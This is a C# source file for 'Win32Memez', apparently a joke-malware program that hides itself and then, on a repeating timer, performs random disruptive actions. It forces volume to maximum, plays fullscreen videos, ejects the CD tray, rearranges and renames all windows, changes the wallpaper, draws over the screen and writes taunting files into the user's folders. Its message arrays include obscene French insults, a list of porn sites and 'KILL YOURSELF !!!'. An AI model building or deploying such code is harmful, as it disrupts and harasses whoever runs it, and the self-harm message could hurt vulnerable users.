using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using AudioSwitcher.AudioApi.CoreAudio;

namespace Win32Memez
{
    public partial class Form1 : Form
    {

        CoreAudioDevice defaultPlaybackDevice = new CoreAudioController().DefaultPlaybackDevice;

        [DllImport("winmm.dll", EntryPoint = "mciSendString")]
        public static extern int mciSendStringA(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);
        String rt = "";

        Boolean debug = false;

        String[] messages = {
                                "U Wot M8 ?",
                                "The fitnessgram pacer test is a multi-stage arobic capacity test that gets more difficult as it continues...",
                                "Mais oui c'est claire !",
                                "Erreur système, voulez-vous supprimer 'C:/Windows/System32' ?",
                                "Clavier non détecté, appuyez sur une touche pour continuer...",
                                "Appuyez sur ESC pour aller vous faire foutre.",
                                "My life is potatos...",
                                "AHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH !!!!!!!!!!!!",
                                "Votre ordinateur est pourri, veuillez résoudre ce problème en l'enfonçant dans votre anus.",
                                "KILL YOURSELF !!!"
                            };

        String[] websites = {
                                "http://potato.io",
                                "http://www.republiquedesmangues.fr/",
                                "https://www.google.be/search?q=Comment ne pas être con",
                                "https://www.google.be/search?q=Comment gagner plus de 10000 euro pas seconde",
                                "https://www.google.be/search?q=Comment aller sur google",
                                "https://www.facebook.com/Vladimir-Poutine-840688922625495/?nr",
                                "https://www.youtube.com/channel/UC7-Vq032-UWOyJtaAbGOvVg/feed",
                                "https://www.youtube.com/watch?v=2uGqebmfwms",
                                "https://fr.wikipedia.org/wiki/Chou-fleur",
                                "http://www.partridgegetslucky.com/"
                            };

        String[] notepad = {
                                "Site a visiter ce soir:\n\r\n\r- youporn.com\n\r- xvideo.com\n\r- e621.net\n\r- rule34.org",
                                "J'aime les pommes de terres cuites au four.",
                                "Ta mère, c'est comme un caddy, 50 cents et c'est parti !",
                                "Ce fichier vous rappelle que vous êtes un horrible con...",
                                "Le chou-fleur est une variété de chou de la famille des Brassicacées, cultivée comme plante potagère pour son méristème floral hypertrophié et charnu, consommé comme légume. Le terme désigne aussi ce légume.",
                                "La pomme de terre, ou patate (langage familier, canadianisme et belgicisme), est un tubercule comestible produit par l’espèce Solanum tuberosum, appartenant à la famille des solanacées.",
                                "Comment Ruquier enlève-t-il sa capote ? EN PETTANT XDDDDDDDDDD",
                                "sdojfjqsjd5hfqhdjfqs6jDH75JF54QLKSDGJ5KQFJQDJLF4j54jlJJKJKJLKJHJHUhhu24uHUJhuGGY4gbyBGYbguy56544524265245 (sa veux rien dir lol)",
                                "Chaques jours, des milliers d'imbeciles utilise un ordinateur, aider nous à http://onsefoudevotreguele.fr/",
                                "Il étais une fois une licorne qui enculais Eddy Malou..."
                            };

        String[] window_names = {
                                "Wirus.exe - #SeemsLegit",
                                "Netscape",
                                "Mikrosoft teknical supp0rt",
                                "8====-",
                                "Penis.txt",
                                "<insérez nom de fenêtre ici>",
                                "Ceci n'est pas un titre.",
                                "Win32Memez est au contrôle de votre ordinateur.",
                                "Balançoire",
                                "Best club penguin meme compilation 2015 (legit)"
                            };

        

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            CheckForIllegalCrossThreadCalls = false;
            extractResource();
            initPlayer();
            minimize();
            if (File.Exists("Win32Memez.vshost.exe"))
            {
                MessageBox.Show("Win32Memez built correctly !\nRunning in debug mode.");
                debug = true;
                //Environment.Exit(0);
            }
            timer1.Enabled = true;
        }

        void extractResource()
        {
            extract(Encoding.Unicode.GetBytes(Win32Memez.Properties.Resources.EasterEgg), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Important.txt");
            extract(Win32Memez.Properties.Resources.wtf_guy, "temp/video0.mp4");
            extract(Win32Memez.Properties.Resources.idiot, "temp/video1.mp4");
            extract(Win32Memez.Properties.Resources.reposted, "temp/video2.mp4");
            extract(Win32Memez.Properties.Resources.bedrum, "temp/video3.mp4");
            extract(Win32Memez.Properties.Resources.penguin, "temp/video4.mp4");
            extract(Win32Memez.Properties.Resources.pacer_test, "temp/sound0.mp3");
            extract(Win32Memez.Properties.Resources.annoying_ad, "temp/sound1.mp3");
            extract(Win32Memez.Properties.Resources.einstein, "temp/sound2.mp3");
            extract(Win32Memez.Properties.Resources.scream, "temp/sound3.mp3");
            extract(Win32Memez.Properties.Resources.spongebob, "temp/sound4.mp3");
            Win32Memez.Properties.Resources.dictator.Save("temp/image0.bmp");
            Win32Memez.Properties.Resources.doge.Save("temp/image1.bmp");
            Win32Memez.Properties.Resources.mlg.Save("temp/image2.bmp");
            Win32Memez.Properties.Resources.plotapus.Save("temp/image3.bmp");
            Win32Memez.Properties.Resources.clickbait.Save("temp/image4.bmp");
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            timer1.Enabled = false;
            Random randomizer = new Random();
            int r = randomizer.Next(11);
            switch (r)
            {
                case 0:
                    MessageBox.Show(messages[randomizer.Next(messages.Count())]);
                    timer1.Enabled = true;
                    break;
                case 1:
                    minimize();
                    if (!debug) { defaultPlaybackDevice.Volume = 100; }
                    play("temp/sound" + randomizer.Next(5) + ".mp3");
                    break;
                case 2:
                    Cursor.Hide();
                    maximize();
                    if (!debug) { defaultPlaybackDevice.Volume = 100; }
                    play("temp/video" + randomizer.Next(5) + ".mp4");
                    break;
                case 3:
                    if (!debug) { defaultPlaybackDevice.Volume = 100; }
                    Process.Start(websites[randomizer.Next(websites.Count())]);
                    timer1.Enabled = true;
                    break;
                case 4:
                    String path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "/important.txt";
                    File.WriteAllText(path,notepad[randomizer.Next(notepad.Count())]);
                    Process.Start("notepad.exe", path);
                    timer1.Enabled = true;
                    break;
                case 5:
                    try
                    {
                        mciSendStringA("set CDAudio door open", rt, 127, 0);
                    }
                    catch
                    {

                    }
                    timer1.Enabled = true;
                    break;
                case 6:
                    IntPtr lShellWindow = hWindows.GetShellWindow();
                    List<IntPtr> listWindows = new List<IntPtr>();
                    
                    hWindows.EnumWindows(delegate(IntPtr wnd, IntPtr param)
                    {
                        if (wnd == lShellWindow) return true;
                        if (!hWindows.IsWindowVisible(wnd)) return true;
                        
                        listWindows.Add(wnd);
                        return true;
                    }, 0);

                    for (int i = 0; i < listWindows.Count(); i++)
                    {
                        hWindows.MoveWindow(listWindows.ElementAt(i), randomizer.Next(Screen.PrimaryScreen.Bounds.Width),
                                                                      randomizer.Next(Screen.PrimaryScreen.Bounds.Height),
                                                                      randomizer.Next(100,Screen.PrimaryScreen.Bounds.Width),
                                                                      randomizer.Next(100,Screen.PrimaryScreen.Bounds.Height), 
                                                                      true);
                    }
                    timer1.Enabled = true;
                    break;
                case 7:
                    IntPtr lShellWindow1 = hWindows.GetShellWindow();
                    List<IntPtr> listWindows1 = new List<IntPtr>();
                    
                    hWindows.EnumWindows(delegate(IntPtr wnd, IntPtr param)
                    {
                        if (wnd == lShellWindow1) return true;
                        if (!hWindows.IsWindowVisible(wnd)) return true;
                        
                        listWindows1.Add(wnd);
                        return true;
                    }, 0);

                    for (int i = 0; i < listWindows1.Count(); i++)
                    {
                        hWindows.SetWindowText(listWindows1.ElementAt(i),window_names[randomizer.Next(window_names.Count())]);
                    }
                    timer1.Enabled = true;
                    break;
                case 8:
                    String image_path = Path.GetFullPath("temp/image" + randomizer.Next(5) + ".bmp");
                    Wallpaper.Set(new Uri(image_path), Wallpaper.Style.Stretched);
                    timer1.Enabled = true;
                    break;
                case 9:
                    for (int i = 0; i < 1000; i++)
                    {
                        FrameBuffer.Drawer.DrawLine(new Pen(new SolidBrush(Color.FromArgb(randomizer.Next(256), randomizer.Next(256), randomizer.Next(256)))),
                                                    new Point(randomizer.Next(Screen.PrimaryScreen.Bounds.Width), randomizer.Next(Screen.PrimaryScreen.Bounds.Height)),
                                                    new Point(randomizer.Next(Screen.PrimaryScreen.Bounds.Width), randomizer.Next(Screen.PrimaryScreen.Bounds.Height)));
                    }
                    
                    timer1.Enabled = true;
                    break;
                case 10:
                    for (int i = 0; i < 100; i++)
                    {
                        FrameBuffer.Drawer.DrawIcon(Win32Memez.Properties.Resources.pepe, new Rectangle(randomizer.Next(Screen.PrimaryScreen.Bounds.Width),
                                                                                                        randomizer.Next(Screen.PrimaryScreen.Bounds.Height),
                                                                                                        randomizer.Next(16,256),
                                                                                                        randomizer.Next(16,256)));
                    }
                    timer1.Enabled = true;
                    break;
            }
            
        }

        private void initPlayer()
        {
            Player.windowlessVideo = true;
            Player.stretchToFit = true;
            Player.enableContextMenu = false;
            Player.uiMode = "none";
        }

        private void play(String file)
        {
            Player.URL = file;
            Player.Ctlcontrols.play();
        }

        private void extract(byte[] resource, String path)
        {
            try
            {
                if (!File.Exists(path))
                {
                    if (!Directory.Exists(new FileInfo(path).Directory.FullName))
                    {
                        Directory.CreateDirectory(new FileInfo(path).Directory.FullName);
                    }
                    File.WriteAllBytes(path, resource);
                }
            }
            catch
            {
                // Kill yourself !
            }
        }

        private void minimize()
        {
            this.TopMost = !debug;
            this.Visible = false;
            this.Size = new Size(0, 0);
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.WindowState = FormWindowState.Minimized;
        }

        private void maximize()
        {
            this.TopMost = !debug;
            this.Visible = true;
            this.Location = new Point(0, 0);
            this.Size = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.WindowState = FormWindowState.Maximized;
        }

        private void Player_PlayStateChange(object sender, AxWMPLib._WMPOCXEvents_PlayStateChangeEvent e)
        {
            if (Player.playState == WMPLib.WMPPlayState.wmppsMediaEnded)
            {
                minimize();
                Cursor.Show();
                timer1.Enabled = true;
            }
        }
    }
}
